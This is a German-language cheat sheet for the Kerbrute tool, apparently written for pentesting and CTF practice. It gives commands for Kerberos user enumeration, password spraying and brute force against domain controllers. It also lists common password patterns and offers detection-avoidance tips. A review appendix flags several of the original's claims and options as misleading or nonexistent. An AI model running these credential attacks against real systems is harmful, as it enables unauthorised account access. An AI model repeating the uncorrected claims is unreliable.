# 🔑 Kerbrute - Kerberos-Benutzerermittlung

<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md)

```
  ██╗  ██╗███████╗██████╗ ██████╗ ██████╗ ██╗   ██╗████████╗███████╗
  ██║ ██╔╝██╔════╝██╔══██╗██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝
  █████╔╝ █████╗  ██████╔╝██████╔╝██████╔╝██║   ██║   ██║   █████╗  
  ██╔═██╗ ██╔══╝  ██╔══██╗██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  
  ██║  ██╗███████╗██║  ██║██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗
  ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝
           Werkzeug für Brute Force gegen Kerberos-Pre-Auth
```

<p align="center">
  <img src="https://img.shields.io/badge/Kerbrute-Kerberos-red?style=for-the-badge" alt="Kerbrute">
  <img src="https://img.shields.io/badge/User_Enumeration-blue?style=for-the-badge" alt="Enum">
  <img src="https://img.shields.io/badge/Password_Spray-green?style=for-the-badge" alt="Spray">
</p>

---

## 📋 Inhaltsverzeichnis

- [Was ist Kerbrute?](#-was-ist-kerbrute)
- [Installation](#-installation)
- [Benutzerermittlung](#-benutzerermittlung)
- [Password Spraying](#-password-spraying)
- [Brute Force](#-brute-force)
- [Kurzreferenz](#-kurzreferenz)
- [CTF-Tipps](#-ctf-tipps)
- [Ressourcen](#-ressourcen)
- [Hinweise zum Original und zu Versionen](#-hinweise-zum-original-und-zu-versionen)

---

## 🎯 Was ist Kerbrute?

**Kerbrute** nutzt die Kerberos-Vorauthentifizierung (Pre-Authentication), um Benutzerkonten zu ermitteln und Password Spraying durchzuführen:

- 🔍 **Benutzerermittlung (User Enumeration)** - Gültige Benutzernamen ohne Zugangsdaten finden!
- 🔐 **Password Spray** - Ein Passwort bei vielen Benutzerkonten testen
- 💥 **Brute Force** - Zugangsdaten umfassend testen
- 🚫 **Kein Sperrrisiko** - Fehler bei der Vorauthentifizierung lösen keine Kontosperren aus

### Warum Kerbrute?

| Methode | Löst Kontosperre aus | Erzeugt Protokolle |
|--------|------------------|----------------|
| LDAP-Bind | Ja | Ja |
| SMB-Authentifizierung | Ja | Ja |
| **Kerberos-Pre-Auth** | **Nein** | Minimal |

---

## 🚀 Installation

### Binärdatei herunterladen

```bash
# Linux
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
chmod +x kerbrute_linux_amd64
mv kerbrute_linux_amd64 /usr/local/bin/kerbrute

# Windows (PowerShell)
Invoke-WebRequest -Uri "https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe" -OutFile kerbrute.exe
```

### Aus dem Quellcode

```bash
go install github.com/ropnop/kerbrute@latest
```

### Installation überprüfen

```bash
kerbrute --help
```

---

## 🔍 Benutzerermittlung

### Grundlegende Verwendung

```bash
# Benutzer anhand einer Wortliste ermitteln
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt

# Mit dem Hostnamen des Domänencontrollers
kerbrute userenum -d domain.local --dc dc01.domain.local users.txt
```

### Ausgabeoptionen

```bash
# Ausführliche Ausgabe
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt -v

# Ausgabe in eine Datei schreiben
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt -o valid_users.txt

# JSON-Ausgabe
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt --json -o results.json
```

### Threads

```bash
# Anzahl der Threads erhöhen (Standard: 10)
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt -t 50

# Sicherer Einsatz von Threads
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt -t 20 --delay 100
```

### Beispielausgabe

```
2024/01/15 10:30:00 >  [+] VALID USERNAME:    admin@domain.local
2024/01/15 10:30:01 >  [+] VALID USERNAME:    john@domain.local
2024/01/15 10:30:02 >  [+] VALID USERNAME:    svc_sql@domain.local
```

---

## 🔐 Password Spraying

### Einfaches Password Spraying

```bash
# Ein Passwort bei mehreren Benutzerkonten testen
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Password123!'

# Aus einer Datei
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Summer2024!'
```

### Mehrere Passwörter

```bash
# Mehrere Passwörter per Spraying testen (jeweils nur eines!)
for pass in $(cat passwords.txt); do
    echo "Trying: $pass"
    kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt "$pass"
    sleep 300  # Zwischen Spraying-Durchläufen 5 Minuten warten
done
```

### Ausgabe

```bash
# Gültige Zugangsdaten ausgeben
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Pass123!' -o valid_creds.txt
```

### Beispielausgabe

```
2024/01/15 10:35:00 >  [+] VALID LOGIN:    john@domain.local:Password123!
2024/01/15 10:35:01 >  [+] VALID LOGIN:    admin@domain.local:Password123!
```

### Sicheres Password Spraying

```bash
# Zuerst die Passwortrichtlinie prüfen!
crackmapexec ldap DC01 -u user -p pass --password-policy

# Wenige Versuche mit zeitlichem Abstand
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Pass!' -t 5 --delay 500
```

---

## 💥 Brute Force

### Vollständiger Brute Force

```bash
# Alle Kombinationen im Format username:password testen
kerbrute bruteuser -d domain.local --dc 10.10.10.10 passwords.txt admin
```

### Kombinierte Liste

```bash
# Im Format username:password
kerbrute bruteforce -d domain.local --dc 10.10.10.10 creds.txt

# Format von creds.txt:
# admin:Password1
# john:Summer2024
```

---

## 📊 Kurzreferenz

### Befehle

| Befehl | Beschreibung |
|---------|-------------|
| `userenum` | Gültige Benutzernamen ermitteln |
| `passwordspray` | Ein Passwort bei mehreren Benutzerkonten testen |
| `bruteuser` | Brute Force für ein einzelnes Benutzerkonto |
| `bruteforce` | Kombinationen im Format user:pass testen |

### Wichtige Optionen

| Option | Beschreibung |
|--------|-------------|
| `-d` | Domänenname |
| `--dc` | IP-Adresse oder Hostname des Domänencontrollers |
| `-t` | Threads (Standard: 10) |
| `-o` | Ausgabedatei |
| `-v` | Ausführliche Ausgabe |
| `--delay` | Wartezeit zwischen Versuchen (ms) |

### Benutzerermittlung

```bash
# Grundlegend
kerbrute userenum -d DOMAIN --dc DC_IP users.txt

# Mit Ausgabe in eine Datei
kerbrute userenum -d DOMAIN --dc DC_IP users.txt -o valid.txt

# Schnell
kerbrute userenum -d DOMAIN --dc DC_IP users.txt -t 50
```

### Password Spray

```bash
# Einfaches Spraying
kerbrute passwordspray -d DOMAIN --dc DC_IP users.txt 'Password!'

# Sicheres Spraying
kerbrute passwordspray -d DOMAIN --dc DC_IP users.txt 'Pass!' -t 5 --delay 500
```

### Wortlisten für die Benutzerermittlung

```bash
# Häufige Namen
/usr/share/seclists/Usernames/Names/names.txt

# Häufige Benutzernamen
/usr/share/seclists/Usernames/top-usernames-shortlist.txt

# Eigenes Format
echo -e "administrator\nadmin\nuser\njohn\njane" > users.txt
```

### Häufige Passwörter

```
Jahreszeit+Jahr: Summer2024!, Winter2024!, Fall2024!
Unternehmen+Zahl: CompanyName123!, Company2024!
Allgemein: Password1, Welcome1, P@ssw0rd
```

---

## 🎯 CTF-Tipps

1. **Zuerst immer Benutzer ermitteln** - Benutzernamen ohne Zugangsdaten erhalten!
2. **AS-REP prüfen** - Nach der Benutzerermittlung prüfen, ob Konten keine Vorauthentifizierung verlangen
3. **Password Spraying vorsichtig durchführen** - Ein Passwort testen, dann warten
4. **Richtlinie prüfen** - Den Schwellenwert für Kontosperren kennen
5. **Wartezeit verwenden** - Erkennung vermeiden

### Ablauf

```bash
# 1. Benutzer ermitteln
kerbrute userenum -d domain.local --dc 10.10.10.10 names.txt -o users.txt

# 2. Auf für AS-REP Roasting geeignete Konten prüfen
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.10 -no-pass

# 3. Password Spraying
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Summer2024!'
```

---

## 📚 Ressourcen

- [Kerbrute GitHub](https://github.com/ropnop/kerbrute)
- [ropnop Blog](https://blog.ropnop.com/)

### Verwandte Cheatsheets
- [AD-Methodik](../../AD-Attack-Methodology/translations/README.de.md)
- [Rubeus](../../Rubeus/translations/README.de.md)
- [CrackMapExec](../../CrackMapExec/translations/README.de.md)

---

## 📝 Hinweise zum Original und zu Versionen

> Stand der Prüfung: 2. November 2026. Die Beispiele des englischen Originals bleiben unverändert erhalten. Die folgenden Hinweise korrigieren ihre Einordnung; sie bestätigen keine sichere Ausführung.

- **Kontosperren und Protokollierung:** Die pauschale Aussage „kein Sperrrisiko“ und die Vergleichstabelle sind irreführend. `userenum` fragt ohne Vorauthentifizierung an und testet dabei kein Passwort. Fehlgeschlagene Passwortversuche mit `passwordspray`, `bruteuser` oder `bruteforce` zählen dagegen als fehlgeschlagene Anmeldungen und können Konten sperren. Auch Benutzerermittlung kann Kerberos-Ereignisse erzeugen; eine Wartezeit verhindert die Erkennung nicht. Sperrschwelle, Rücksetzintervall und bereits aufgelaufene Fehlversuche sind zu berücksichtigen. Fünf Minuten Pause sind keine allgemeingültige Zusicherung. `--safe` bricht bei einer gemeldeten Sperre ab und verhindert diese nicht im Voraus. [Offizielle Kerbrute-Dokumentation](https://github.com/ropnop/kerbrute).
- **Versionen und Optionen:** Die Downloads sind ausdrücklich auf `v1.0.3` festgelegt; `@latest` bezeichnet nicht zwingend denselben Quellstand. Im geprüften Upstream-Flag-Satz existiert `--json` nicht. Das entsprechende Originalbeispiel funktioniert daher mit dieser Fassung nicht. Die Hilfe beschreibt `--delay` als Ein-Thread-Modus; im geprüften Quellcode erfolgt die zugehörige Thread-Umstellung jedoch bereits in `init()`, vor dem Einlesen der Kommandozeilenargumente. Die spätere Einrichtung protokolliert den Ein-Thread-Modus lediglich. Aus der Kombination mit `-t` darf deshalb keine verlässliche Beschränkung auf einen Thread abgeleitet werden. [Flag-Definitionen](https://github.com/ropnop/kerbrute/blob/master/cmd/kerbrute.go), [Sitzungseinrichtung](https://github.com/ropnop/kerbrute/blob/master/cmd/setup.go).
- **Ausgabedateien und Ablauf:** `-o` schreibt ein Protokoll mit Zeitstempeln und weiteren Meldungen, keine bereinigte Benutzernamen- oder Zugangsdatenliste. Die im Ablauf erzeugte `users.txt` eignet sich daher nicht unverändert als Eingabe für den nächsten Schritt: `GetNPUsers.py` erwartet bei `-usersfile` Benutzernamen zeilenweise. Auch `valid_users.txt` und `valid_creds.txt` sind lediglich frei gewählte Dateinamen und garantieren kein solches Datenformat. Die gezeigten Erfolgsmeldungen sind Beispiele, keine Zusage eines Ergebnisses. [Kerbrute-Logger](https://github.com/ropnop/kerbrute/blob/master/util/log.go), [Impacket-Quellcode](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py).
- **Bedeutung der Eingaben:** `bruteuser` prüft die Passwortliste für genau das angegebene Benutzerkonto; `bruteforce` prüft die vorgegebenen Paare und erzeugt nicht selbst alle möglichen Kombinationen. Beim mit „Aus einer Datei“ kommentierten Spraying-Beispiel stammt nur die Benutzerliste aus der Datei; das Passwort ist ein direktes Argument. [Befehlsübersicht](https://github.com/ropnop/kerbrute), [bruteuser](https://github.com/ropnop/kerbrute/blob/master/cmd/bruteuser.go), [bruteforce](https://github.com/ropnop/kerbrute/blob/master/cmd/bruteforce.go).
- **Shell-Schleife und Richtlinienabfrage:** Die unquotierte Ausgabe von `$(cat passwords.txt)` wird durch die Shell in Wörter zerlegt; Passwörter mit Leerraum bleiben in dieser Beispielschleife nicht zuverlässig als vollständige Zeilen erhalten. Außerdem definiert der geprüfte ursprüngliche CrackMapExec-LDAP-Parser keine Option `--password-policy`. Das gezeigte Beispiel ist daher keine verlässliche Richtlinienabfrage. [Bash-Handbuch zur Wortaufteilung](https://www.gnu.org/software/bash/manual/html_node/Word-Splitting.html), [CrackMapExec-LDAP-Parser](https://github.com/Porchetta-Industries/CrackMapExec/blob/master/cme/protocols/ldap/proto_args.py).

---

<p align="center">
  <b>🔑 Benutzer ermitteln, Passwörter per Spraying testen!</b><br>
  <i>Kerbrute - Der unauffällige Weg hinein</i>
</p>
